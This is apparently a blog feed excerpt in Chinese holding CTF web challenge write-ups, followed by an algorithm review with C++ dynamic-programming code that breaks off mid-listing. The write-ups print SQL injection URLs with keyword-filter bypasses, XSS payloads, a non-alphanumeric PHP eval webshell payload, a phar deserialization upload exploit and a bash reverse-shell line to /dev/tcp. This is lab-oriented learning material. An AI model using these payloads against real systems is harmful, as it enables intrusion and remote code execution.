    <content type="html"><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>MYSQL #后面内容会被注释<br>version()获取数据库版本<br>@@version_compile_os获取操作系统</p><h1 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h1><p>查看源码<br><img src="https://i.imgur.com/appELmb.png" alt=""><br>md5弱类型构造user:s878926199a md5加密为0<br><img src="https://i.imgur.com/hzta7UG.png" alt=""><br>构造serialize，bool类型为True<br>根据<img src="https://i.imgur.com/DlXwh4m.png" alt=""><br>构造代码：</p><pre><code>&lt;?php$test1=array(&quot;user&quot;=&gt;true,&quot;pass&quot;=&gt;true);echo var_dump($test1);echo var_dump(serialize($test1));?&gt;</code></pre><p>pass修改拿flag</p><h1 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h1><p>key: vim编辑时产生隐藏文件swp即后缀名为.swp，文件退出自动删除。<br>隐藏文件前面加.</p><p>查看源码发现关键信息，Vim编辑和admin邮箱地址</p><ol><li><p>输入1弹出<br><img src="https://i.imgur.com/fLRKRmQ.png" alt=""><br>访问<code>http://ctf5.shiyanbar.com/10/upload/step2.php</code>发现返回step1。                  </p></li><li><p>Burp截包发现跳转到submit.php验证<br>访问<code>http://ctf5.shiyanbar.com/10/upload/submit.php</code>发现不是管理员，由此想到隐藏文件<code>.submit.php.swp</code>访问之后，发现token验证。<br><img src="https://i.imgur.com/UJu82yd.png" alt=""></p></li><li><p>利用0e00000000绕过<br><img src="https://i.imgur.com/pAotWoT.png" alt=""></p><pre><code>payload:http://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin@simplexue.com&amp;token=0e00000000</code></pre><h1 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h1><p>注意Python3中的bytes-str的转换<br>Burp抓包发现Flag，每次提交Flag变化，脚本提交。</p></li></ol><p>脚本如下</p><pre><code>import requestsimport base64url=&quot;http://ctf5.shiyanbar.com/web/10/10.php&quot;r=requests.get(url)if &apos;FLAG&apos;in r.headers:        x=bytes(r.headers[&apos;FLAG&apos;],&quot;utf-8&quot;)        key=base64.b64decode(x).decode(&apos;utf-8&apos;).split(&apos;:&apos;)[1]        data={&apos;key&apos;:key}        print(requests.post(url,data=data).text)</code></pre><h1 id="简单的注入"><a href="#简单的注入" class="headerlink" title="简单的注入"></a>简单的注入</h1><p>空格+关键词绕过</p><p><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39;  unionunion  selectselect  schema.name  fromfrom  infromation_schema.schemata  wherewhere &#39;1&#39;=&#39;1</code></p><p><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39;  unionunion  selectselect  table_name  fromfrom  information_schema.tables  wherewhere  &#39;1&#39;=&#39;1</code></p><p>coulumn_name被绕过，因此修改绕过字段</p><p><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39; unionunion  selectselect  column_namcolumn_namee  fromfrom  information_scheminformation_schema.columnsa.columns  wherewhere  table_name=&#39;flag</code></p><p>找到字段flag查找<br><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39;  unionunion  selectselect  flag  fromfrom  flag  wherewhere  &#39;1&#39;=&#39;1</code></p><h1 id="简单的注入2"><a href="#简单的注入2" class="headerlink" title="简单的注入2"></a>简单的注入2</h1><p>与1不同的是并非关键字和空格，过滤掉所有空格，没有回显。</p><p>爆库 表 和列换注释绕过空格<br><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39;/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/&#39;1&#39;=&#39;1</code></p><p><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39;/**/union/**/select/**/columcolumn_namen_name/**/from/**/information_scheminformation_schema.columnsa.columns/**/where/**/&#39;1&#39;=&#39;1</code></p><p><code>http://ctf5.shiyanbar.com/web/index_2.php?id=1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1</code></p><h1 id="简单的注入3"><a href="#简单的注入3" class="headerlink" title="简单的注入3"></a>简单的注入3</h1><h1 id="NSCTF"><a href="#NSCTF" class="headerlink" title="NSCTF"></a>NSCTF</h1><p>很简单的一个密码变换。一个逆序过程。附代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$_=<span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a=strrev(base64_decode((strrev((str_rot13($_))))));</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($a);$i++)&#123;</span><br><span class="line">$b=substr($a,$i,<span class="number">1</span>);</span><br><span class="line">$c=ord($b)<span class="number">-1</span>;</span><br><span class="line">$d=chr($c);</span><br><span class="line">$e=$e.$d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$e"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="你真的会PHP吗"><a href="#你真的会PHP吗" class="headerlink" title="你真的会PHP吗"></a>你真的会PHP吗</h1><p>抓包看到 6c525af4059b4fe7d8c33a.txt,访问之后看到源码。<br>分析源码要满足条件</p><ol><li>number不是数字</li><li>$req[‘number’]==strval(intval($req[‘number’]</li><li>$value1 = intval($req[“number”]);<br>$value2 = intval(strrev($req[“number”]));要相等<br>$number不是回文数  </li></ol><p>操作系统，32位有符号数int范围-2147483648~2147483647，<br>构造<code>2147483647%00</code>绕过</p><p>tips:strval会忽略掉%00与%20 </p><h1 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h1><p>urldecode让URL解码后，等于hackerDj,因为提交的时候浏览器会自动解码一次，PHP处理时解码一次，故解码两次。因此对hackerDJ进行URL编码两次构造<br><code>http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568ackerDJ</code></p><p>flag;</p><h1 id="这看起来有点简单"><a href="#这看起来有点简单" class="headerlink" title="这看起来有点简单"></a>这看起来有点简单</h1><p>常规注入。未加任何<br><a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1</a> union select 1,schema_name from information_schema.schemata</p><p><a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1</a> union select 1,table_name from information_schema.tables where table_schema=’my_db’;</p><p><a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1</a> union select 1,column_name from information_schema.columns where table_name=’thiskey’</p><p><a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1</a> union select 1,column_name from information_schema.columns where table_name=’thiskey’</p><p><a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1</a> union select 1,k0y from thiskey</p><h1 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h1><p>抓包构造 X-Forwarder-for:1.1.1.1<br>客户端最原始的IP地址</p><h1 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h1><p>1.Tips很明确，修改头部，条件检测 .net framework 9.9,官方文档说检测到他会在头部UA中加入 <code>.NET CLR 9.9</code><br>2.伪造IE浏览器加入  <code>compatible; MSIE 9.0；</code>信息</p><h1 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h1><p>sleep注入   wait….</p><h1 id="Guess-Next-Session"><a href="#Guess-Next-Session" class="headerlink" title="Guess Next Session"></a>Guess Next Session</h1><p>查看代码分析，根据随机生成器生成数字，要使Session的password跟输入的password相等。删除COOKIE 中  PHPSESSID,删除password值。<br>null=null,通过验证。  </p><h1 id="False"><a href="#False" class="headerlink" title="False"></a>False</h1><p>md5和sha1无法处理数组，处理结果都为null,构造<br><code>http://ctf5.shiyanbar.com/web/false.php?name[]=1&amp;password[]=2</code></p><h1 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h1><p>抓包，将showsource改为1；发现隐藏表单字段。提交正确PIN码即可。</p><h1 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h1><p>ereg函数存在截断漏洞， %00截断，ereg不会解析后面的字符。<br>利用科学记数法绕过数字大小。<br><code>http://ctf5.shiyanbar.com/web/more.php?password=1e8%00*-*</code></p><h1 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h1><p>关键点<br>if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) </p><p>密码值经过md5加密后相等，构造查询语句使得$sql查询语句返回md5(1)的值，构造<br>`user=1’ union select ‘c4ca4238a0b923820dcc509a6f75849b’</p><p><code>1</code></p><h1 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h1><p>主要考察SQL基本功；看到代码分析。</p><p>过滤了关键字$filter = “and|select|from|where|union|join|sleep|benchmark|,|(|)“;</p><p>不能使用这些关键字查询。</p><p>但是有一个mysql_num_rows($query) == 1判断。</p><p>使用 limit 1 offset 0进行限制绕过。</p><p>看了大佬的writeup知道 with rollup 可进行分组统计数据基础上再进行相同的统计。<br>使用 <code>1&#39; or 1=1 group by pwd with rollup limit 1 offset 2#</code></p><p>恰好使 pwd=null, 然后  if(null=null)绕过 。</p><h1 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h1><p>伪静态技术<br>构造<code>http://ctf5.shiyanbar.com/indirection/index.php/user/index.php</code>会把user解析为参数名，把后面的index.php解析为参数值。</p><p>#</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sql注入&quot;&gt;&lt;a href=&quot;#sql注入&quot; class=&quot;headerlink&quot; title=&quot;sql注入&quot;&gt;&lt;/a&gt;sql注入&lt;/h1&gt;&lt;p&gt;MYSQL #后面内容会被注释&lt;br&gt;version()获取数据库版本&lt;br&gt;@@version_compile_o
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>D0g3 Game Writeup</title>
    <link href="http://yoursite.com/2018/12/01/D03games/"/>
    <id>http://yoursite.com/2018/12/01/D03games/</id>
    <published>2018-11-30T16:00:00.000Z</published>
    <updated>2018-12-23T04:15:47.004Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss1"><a href="#xss1" class="headerlink" title="xss1"></a>xss1</h1><ol><li>标签之内<br><code>&lt;input type=&quot;text&quot; value=&quot;[输出]&quot;/&gt;</code>  </li><li>闭合属性,onmouseover事件触发脚本<br><code>&quot; onmouseover=alert(1) x=</code><br>闭合属性后闭合标签，执行脚本<br><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>  </li><li>输入类型为隐藏的输入字段<br><code>&lt;input type=&quot;hidden&quot; value=&quot;[输出]&quot; /&gt;</code><br>输入<br><code>1&quot; onmouseover=alert(1) type=&quot;text</code>闭合   </li><li>在src/href/action属性内<br><code>javascript:alert(1)//</code>   </li><li>成为Javascript值<br>输入在脚本内<code>&lt;script&gt;a=&quot;[输出]&quot;;...&lt;/script&gt;</code><br><code>&lt;/script&gt;&lt;/script&gt;alert(1)//</code><br><code>&quot;;alert(1);//</code>   <h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><code>@eval($code)</code><br>字符串按照PHP代码执行<br>利用非字母数字构造，执行Flag()函数得到flag,限制长度为50，构造GET变量，传入参数执行函数。不包含数字和字母获取webshell,<br>参考博文<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener"></a></li></ol><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html" target="_blank" rel="noopener"></a></p><p>构造</p><p><img src="https://i.imgur.com/8r9Nrqx.png" alt=""></p><p>php执行命令`和Linux通配符?<br>$_GET[￠]获取参数值</p><p>payload:</p><pre><code>http://120.79.33.253:9000/index.php?code=$￠=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$￠}[￠](${$￠}[￠￠]);&amp;￠=Flag</code></pre><h1 id="matchit"><a href="#matchit" class="headerlink" title="matchit"></a>matchit</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_match_all(<span class="string">"|&lt;[^&gt;]+&gt;(.*)&lt;/[^&gt;]+&gt;|U"</span>,</span><br><span class="line">    <span class="string">"&lt;b&gt;example: &lt;/b&gt;&lt;div align=left&gt;this is a test&lt;/div&gt;"</span>,</span><br><span class="line">    $out, PREG_PATTERN_ORDER);</span><br><span class="line"><span class="keyword">echo</span> $out[<span class="number">0</span>][<span class="number">0</span>] . <span class="string">", "</span> . $out[<span class="number">0</span>][<span class="number">1</span>] . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $out[<span class="number">1</span>][<span class="number">0</span>] . <span class="string">", "</span> . $out[<span class="number">1</span>][<span class="number">1</span>] . <span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//&lt;b&gt;example: &lt;/b&gt;, &lt;div align=left&gt;this is a test&lt;/div&gt;</span></span><br><span class="line">example: , this is a test</span><br></pre></td></tr></table></figure><p>out[0]匹配完整模式字符串数组，out[1]包含闭合标签内的字符串数组。</p><p>PHP字符簇<br>[[:alpha:]]任何字母<br>[[:digit:]]任何数字<br>其余类似</p><p>由代码可知，限制password条件<br>password=42;<br>password长度大于12；<br>password至少匹配<img src="https://i.imgur.com/rSWrlec.png" alt=""><br>3次以上<br>用科学计数法绕过</p><h1 id="wafupload"><a href="#wafupload" class="headerlink" title="wafupload"></a>wafupload</h1><p>分析代码<br><img src="https://i.imgur.com/nrl2dvG.png" alt=""><br>主要限制为白名单后缀名检测，如果文件名不存在用上传文件名，<br>end($file)获取数组最后一个元素检查后缀名，[第一个数组元素]+[数组长度-1]值构成新的文件名。</p><p>利用关联数组绕过检查并构造PHP可执行文件。<br><code>$filename = array(1=&gt;&#39;php&#39;,0=&gt;&#39;jpg&#39;);</code><br>构造<br><img src="https://i.imgur.com/81XIYqN.png" alt=""><br>上传后连接菜刀获取Flag;<br><code>D0g3{18be1a4914ab770a57d5ac92427bcfaf}</code></p><h1 id="不认真的upload"><a href="#不认真的upload" class="headerlink" title="不认真的upload"></a>不认真的upload</h1><p><img src="https://i.imgur.com/CwGjirL.png" alt=""><br>上传gif的得到flag.php<br>访问flag.php发现<br><img src="https://i.imgur.com/KAs0Sek.png" alt=""><br>参考phar对象漏洞。<br><a href="https://paper.seebug.org/680/#23-phar" target="_blank" rel="noopener">https://paper.seebug.org/680/#23-phar</a></p><pre><code>&lt;?php     class flag {         public $file=&apos;phar&apos;;     }    @unlink(&quot;phar.phar&quot;);    $phar = new Phar(&quot;phar.phar&quot;);  //实例一个phar对象    $phar-&gt;startBuffering(); //开始缓冲写操作    $phar-&gt;setStub(&quot;GIF9a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //增加gif文件头，a  stub为一个标志    $o =new flag();     $phar-&gt;setMetadata($o);   //将自定义的meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);   //添加要压缩文件    $phar-&gt;stopBuffering();?&gt;</code></pre><p>生成phar.phar文件，然后上传修改后缀名。<br>访问.<br>payload:<code>http://206.189.214.99:2080/flag.php?filename=phar://upload_file/phar.gif</code></p><h1 id="爆破拿flag"><a href="#爆破拿flag" class="headerlink" title="爆破拿flag"></a>爆破拿flag</h1><p>Burp暴力破解<br>12568响应不同，访问获取flag</p><h1 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a>htmlspecialchars</h1><p>javascript:伪协议；<br>url主体是javascript代码，由javascript解释器运行。;隔开语句。<br>onfocus:对象获得焦点执行。</p><p><code>http://120.79.33.253:9004/?id=111&#39;onmouseover=&#39;javascript:alert(111)</code><br>其他payload:<br><code>1&#39;+onfocus=location=this.name+autofocus+name=&#39;javascript:alert(111)</code><br><code>111&#39;+onfocus=alert(111)+&#39;</code><br><code>111&#39;+onclick=alert(111)+&#39;</code></p><h1 id="BabyFirstRevenge"><a href="#BabyFirstRevenge" class="headerlink" title="BabyFirstRevenge"></a>BabyFirstRevenge</h1><p>Kali修改语言<br>dpkg-reconfigure locales<br>选择字符编码;<br>reboot<br><code>&gt;</code> 结果存入文件<br><code>&gt;&gt;</code>文件内容后追加内容<br><code>\</code>换行，可将一条命令卸载多行<br><code>sh</code> 执行shell脚本<br><code>ls -t</code> 文件按时间顺序排列<br><code>ls -t&gt;</code>可绕过长度限制<br>参考博文<br><a href="https://xz.aliyun.com/t/2748" target="_blank" rel="noopener">https://xz.aliyun.com/t/2748</a></p><p>官方构造</p><pre><code> # generate `ls -t&gt;y` file&apos;&gt;ls\\&apos;, &apos;ls&gt;_&apos;, &apos;&gt;\ \\&apos;, &apos;&gt;-t\\&apos;, &apos;&gt;\&gt;y&apos;, &apos;ls&gt;&gt;_&apos;, </code></pre><p>bash反弹shell参考<a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a><br><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></p><p>后面继续更新。<br><img src="https://i.imgur.com/bzHbCnY.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;xss1&quot;&gt;&lt;a href=&quot;#xss1&quot; class=&quot;headerlink&quot; title=&quot;xss1&quot;&gt;&lt;/a&gt;xss1&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;标签之内&lt;br&gt;&lt;code&gt;&amp;lt;input type=&amp;quot;text&amp;quot; value=&amp;quo
      
    
    </summary>
    
      <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>算法复习</title>
    <link href="http://yoursite.com/2018/11/12/%E7%AE%97%E6%B3%95%E5%A4%8D%E4%B9%A0/"/>
    <id>http://yoursite.com/2018/11/12/算法复习/</id>
    <published>2018-11-11T16:00:00.000Z</published>
    <updated>2018-12-23T04:29:45.369Z</updated>
    
    <content type="html"><![CDATA[<h1 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h1><h2 id="0-1背包"><a href="#0-1背包" class="headerlink" title="0-1背包"></a>0-1背包</h2><p><img src="https://i.imgur.com/ctQOal9.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> b[<span class="number">1005</span>][<span class="number">1005</span>];</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Bag</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> cost, val;</span><br><span class="line">&#125;m[<span class="number">1005</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> t, c, n;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; t;</span><br><span class="line"><span class="keyword">while</span> (t--) &#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; c &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;=n; i++) &#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; m[i].cost &gt;&gt; m[i].val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= c; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (j &gt;= m[i].cost) &#123;</span><br><span class="line">b[i][j] = max(b[i + <span class="number">1</span>][j], b[i + <span class="number">1</span>][j - m[i].cost] + m[i].val);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">b[i][j] = b[i + <span class="number">1</span>][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; b[<span class="number">1</span>][c] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="矩阵连乘"><a href="#矩阵连乘" class="headerlink" title="矩阵连乘"></a>矩阵连乘</h2><p><img src="https://i.imgur.com/KiQfnyx.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 0xffffff</span></span><br><span class="line"><span class="keyword">int</span> p[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">100</span>][<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; p[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> r = <span class="number">2</span>; r &lt;= n; r++) <span class="comment">//层数</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n - r + <span class="number">1</span>; i++) &#123;</span><br><span class="line"><span class="keyword">int</span> j = i + r - <span class="number">1</span>;</span><br><span class="line">m[i][j] = maxn;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> k = i; k &lt; j; k++) &#123;</span><br><span class="line">m[i][j] =min(m[i][j],m[i][k] + m[k + <span class="number">1</span>][j] + p[i - <span class="number">1</span>] * p[k] * p[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; m[<span class="number">1</span>][n] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="最大字段和"><a href="#最大字段和" class="headerlink" title="最大字段和"></a>最大字段和</h2><p>给出一个整数数组a(正负数都有)，如何找出一个连续子数组（可以一个都不取，那么结果为0），使得其中的和最大？</p><p>例如：-2,11,-4,13,-5,-2，和最大的子段为：11,-4,13。和为20。<br>输入</p><p>第1行：整数序列的长度N（2 &lt;= N &lt;= 50000)<br>第2 - N + 1行：N个整数（-10^9 &lt;= A[i] &lt;= 10^9）</p><p>输出</p><p>输出最大子段和。</p><p>输入示例</p><p>6<br>-2<br>11<br>-4<br>13<br>-5<br>-2<br>输出示例 </p><p>20<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Maxsum</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">0</span>, sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (b &gt; <span class="number">0</span>)b +=a[i];</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">b = a[i];</span><br><span class="line">&#125;</span><br><span class="line">sum = max(b, sum);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100</span>], n;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; n) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;Maxsum(a, n)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h2><p>一个字符串A的子串被定义成从A中顺次选出若干个字符构成的串。如A=“cdaad” ,顺次选1，3，5个字符就构成子串” cad” ,现给定两个字符串，求它们的最长共公子串。</p><p>输入格式：第一行两个字符串用空格分开。</p><p>输出格式：最长子串的长度。</p><p>两个串的长度均小于2000</p><p>样例输入</p><p>abccd aecd<br>样例输出</p><p>3</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 